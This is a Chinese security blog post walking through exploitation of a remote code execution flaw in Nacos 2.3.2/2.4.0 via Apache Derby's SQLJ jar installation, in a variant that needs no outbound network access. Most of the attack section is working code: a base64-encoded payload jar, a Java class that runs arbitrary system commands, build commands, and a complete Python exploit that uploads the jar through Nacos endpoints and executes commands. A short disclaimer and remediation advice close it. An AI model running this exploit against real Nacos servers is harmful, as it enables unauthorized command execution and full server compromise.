#  Nacos 1Day RCE不出网利用方式   
原创 Garck3h  pentest   2024-07-17 17:20  
  
## 前言  
  
7.15各个群里以及公众号都在传github上有网友公布了最新的nacos远程代码执行漏洞及exp。以及陆陆续续有大佬们复现了该漏洞。昨晚有师傅问我，不出网的方式怎么利用，我们今天来探讨一下不出网的方式。Nacos是一个更易于构建云原生应用的动态服务发现、配置管理和服务管理平台。  
  
**免责声明：**文章中涉及的内容可能带有攻击性，仅供安全研究与教学之用，读者将其信息做其他用途，由用户承担全部法律及连带责任，文章作者不承担任何法律及连带责任。  
## 利用条件  
  
Nacos某些版本存在远程代码执行漏洞，允许未经授权的代码执行，可能导致服务器被完全控制。  
```
nacos 2.3.2
nacos 2.4.0
以及其它不确定的版本

```  
```
1.需要有访问权限，但是默认的某些配置可能会是为授权访问的。
2.成因是Apache Derby数据库的SQLJ功能安装JAR包并创建自定义函数，从而在数据库环境中执行任意Java方法，最终达到执行系统命令。
Derby数据库执行命令可参考：http://www.lvyyevd.cn/archives/derby-shu-ju-ku-ru-he-shi-xian-rce

```  
## 环境搭建  
  
本次nacos实验环境：V2.3.2  
  
下载：https://github.com/alibaba/nacos/releases  
  
启动命令：  
```
sudo sh startup.sh -m standalone

```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/u3BDsxBAuibW9HfcEjOXoIQaMBGBskuKE6LcC1oWGJrWZkeBVSo3wxialy28TicjcIaNBZPyXnUEvZXZOA0rd6Urg/640?wx_fmt=png&from=appmsg "")  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/u3BDsxBAuibW9HfcEjOXoIQaMBGBskuKEfWiaBZEExFkG8M6BibPo6AcicgzYmXE7NPfibLfePsFhB5icmzmicNm96wGA/640?wx_fmt=png&from=appmsg "")  
  
## EXP分析及利用  
  
看了大佬公开的exp，service文件主要是一个payload  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/u3BDsxBAuibW9HfcEjOXoIQaMBGBskuKEibiaJqNBGLiaMRSYJdp9SKP61LhnUNKQ5zMO9B90xjgaHia9DBgwcgf7eA/640?wx_fmt=png&from=appmsg "")  
  
exploit.py文件：  
1. 代码首先构造了几个关键的 SQL 语句，用于在数据库中安装 JAR 包、创建自定义函数以及执行命令。  
  
1. 通过 HTTP POST 请求将 post_sql 发送到 removal_url。这一步安装了 JAR 包并创建了自定义函数。  
  
1. 检查 POST 请求的响应，如果返回值中有 message 和 data 字段，则发送 GET 请求到 derby_url，执行包含命令的 SQL 语句并获取结果。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/u3BDsxBAuibW9HfcEjOXoIQaMBGBskuKEK3KsgmqofkVmAqqTspytQeGmHEPHTcNIIGstTc0ubMARuDuKIPDicQA/640?wx_fmt=png&from=appmsg "")  
  
试一下这个exp：先执行server.py，再执行exploit.py，这里演示执行命令：id  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/u3BDsxBAuibW9HfcEjOXoIQaMBGBskuKExqcL530eqGYCHLiarYppqhIoP6KW1wfcoFmblzXIssNBQcJmLfaRqMQ/640?wx_fmt=png&from=appmsg "")  
  
## 不出网利用  
  
上面的exp是需要访问我5000端口的web服务下载payload的，如果目标不出网的话，我们应该如何利用呢。  
  
通过把payload进行解码后保存为jar解压查看其内容。这里使用一段简单的python代码进行处理。  
```
import base64


payload = b'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'
data = base64.b64decode(payload)
print(data)

def bytes_to_jar(byte_data, output_file):
    try:
        # 将字节数据写入文件
        with open(output_file, 'wb') as file:
            file.write(byte_data)
        print(f"成功将字节数据写入文件: {output_file}")
    except Exception as e:
        print(f"写入文件失败: {e}")

# 指定输出的文件路径
output_file = "output.jar"

# 调用函数进行转换
bytes_to_jar(data, output_file)

```  
  
得到的 output.jar之后，解压查看里面的类  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/u3BDsxBAuibW9HfcEjOXoIQaMBGBskuKE5N7icDvMURtnBoIGNBdoicyoHAaySzOia4NBWAzEdTjtjWBX4FIUzsKKQ/640?wx_fmt=png&from=appmsg "")  
  
  
我们也可以自己依葫芦画瓢的写一段；先判断一下目标是Linux还是win来设置编码类型。保存为：Garck3h.java  
```
import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.PrintWriter;
import java.io.StringWriter;

public class Garck3h {

    public static void main(String[] args) {
        String result = executeCommand("ipconfig"); // 测试执行 ipconfig 命令
        System.out.println(result);
    }

    public static String executeCommand(String command) {
        StringBuilder output = new StringBuilder();

        try {
            String charset = "utf-8";
            String osName = System.getProperty("os.name");
            if (osName != null && osName.startsWith("Windows")) {
                charset = "gbk";
            }

            Process process = Runtime.getRuntime().exec(command);
            InputStream inputStream = process.getInputStream();
            InputStreamReader inputStreamReader = new InputStreamReader(inputStream, charset);
            BufferedReader reader = new BufferedReader(inputStreamReader);
            String line;

            while ((line = reader.readLine()) != null) {
                output.append(line).append("\n");
            }
            reader.close();
        } catch (IOException e) {
            StringWriter sw = new StringWriter();
            PrintWriter pw = new PrintWriter(sw);
            e.printStackTrace(pw);
            return "ERROR: " + sw.toString();
        }
        return output.toString();
    }
}

```  
  
编译之后，打包为一个jar包  
```
javac -d . Garck3h.java
jar cvf Garck3h.jar Garck3h.class
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/u3BDsxBAuibW9HfcEjOXoIQaMBGBskuKE7lKNgzLVMS2bVHMNWo7IcypfFQVugXkSQNkSP6vPkIv7Z6I9pBXmSA/640?wx_fmt=png&from=appmsg "")  
  
  
把jar包和exp1.py放在同一个目录即可  
  
exp1.py的内容如下：  
- exp主要是从本地读取了一个jar包，然后转为十六进制字符串 jar_hex  
  
- 使用 ThreadPoolExecutor 创建线程池，循环生成随机 ID 和文件名，提交并发任务。  
  
- 检查任务结果，如果找到有效结果，打印结果并停止线程池。  
  
```
import random
import requests
from urllib.parse import urljoin
from concurrent.futures import ThreadPoolExecutor, as_completeddef execute_task(target, command, jar_hex, removal_url, derby_url, id, random_filename):    # SQL 语句，用于将本地读取的JAR包数据写入数据库    post_sql = f"""    CALL SYSCS_UTIL.SYSCS_EXPORT_QUERY_LOBS_TO_EXTFILE('values cast(X''{jar_hex}'' as blob)', '/tmp/{random_filename}', ',', '"', 'UTF-8', '/tmp/{random_filename}.jar')    CALL SQLJ.INSTALL_JAR('/tmp/{random_filename}.jar', 'APP.{id}', 0)    CALL SYSCS_UTIL.SYSCS_SET_DATABASE_PROPERTY('derby.database.classpath', 'APP.{id}')    CREATE FUNCTION S_EXAMPLE_{id}(PARAM VARCHAR(2000)) RETURNS VARCHAR(2000) PARAMETER STYLE JAVA NO SQL LANGUAGE JAVA EXTERNAL NAME 'Garck3h.executeCommand'    """    option_sql = f"UPDATE ROLES SET ROLE='1' WHERE ROLE='1' AND ROLE=S_EXAMPLE_{id}('{command}')"    get_sql = f"SELECT * FROM (SELECT COUNT(*) AS b, S_EXAMPLE_{id}('{command}') AS a FROM config_info) tmp /*ROWS FETCH NEXT*/"    files = {'file': post_sql}    post_resp = requests.post(url=removal_url, files=files)    post_json = post_resp.json()    if post_json.get('message', None) is None and post_json.get('data', None) is not None:        get_resp = requests.get(url=derby_url, params={'sql': get_sql})        return get_resp.text    return Nonedef exploit(target, command, jar_file_path, max_workers=5):    removal_url = urljoin(target, '/nacos/v1/cs/ops/data/removal')    derby_url = urljoin(target, '/nacos/v1/cs/ops/derby')    # 读取本地JAR包数据    with open(jar_file_path, 'rb') as jar_file:        jar_data = jar_file.read()    # 将JAR包数据转换为十六进制字符串    jar_hex = jar_data.hex()    with ThreadPoolExecutor(max_workers=max_workers) as executor:        while True:            futures = []            for i in range(max_workers):  # 每次提交 max_workers 个任务                id = ''.join(random.sample('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ', 8))                random_filename = ''.join(                    random.sample('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789', 8))                futures.append(executor.submit(execute_task, target, command, jar_hex, removal_url, derby_url, id,                                               random_filename))            for future in as_completed(futures):                result = future.result()                if result:                    print(result)                    executor.shutdown(wait=False)                    return  # 找到有效结果后退出if __name__ == '__main__':    target = 'http://127.0.0.1:8848'
    command = 'whoami'
    jar_file_path = 'Garck3h.jar'  # 替换为你的默认JAR包文件路径
    target = input('请输入目录URL，默认：http://127.0.0.1:8848：') or target
    command = input('请输入命令，默认：whoami：') or command
    jar_file_path = input('请输入JAR包文件路径，默认：Garck3h.jar：') or jar_file_path    exploit(target=target, command=command, jar_file_path=jar_file_path)
```  
  
最后还是执行一下id命令。成功返回了id执行的结果数据。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/u3BDsxBAuibW9HfcEjOXoIQaMBGBskuKEkcu7ibK5riaSTkKz45Afj8ATOH84jhVdwGteGHxyD7X3uE2UnW6VJm2Q/640?wx_fmt=png&from=appmsg "")  
  
## 修复建议  
1. 待官方发布安全更新，建议升级至最新版本。  
  
1. 关闭Nacos对外暴露端口。  
  
1. 更改口令为强口令：该漏洞需要登录成功后才能进一步利用  
  
## 参考  
  
[https://mp.weixin.qq.com/s/2pGDhXgvTQa1DqDK6nEn7A](https://mp.weixin.qq.com/s?__biz=Mzk0MjY1MzU1Ng==&mid=2247483710&idx=1&sn=ae28ca7c864d0fcda5eb434992ac5718&scene=21#wechat_redirect)  
  
  
http://www.lvyyevd.cn/archives/derby-shu-ju-ku-ru-he-shi-xian-rce  
  
  
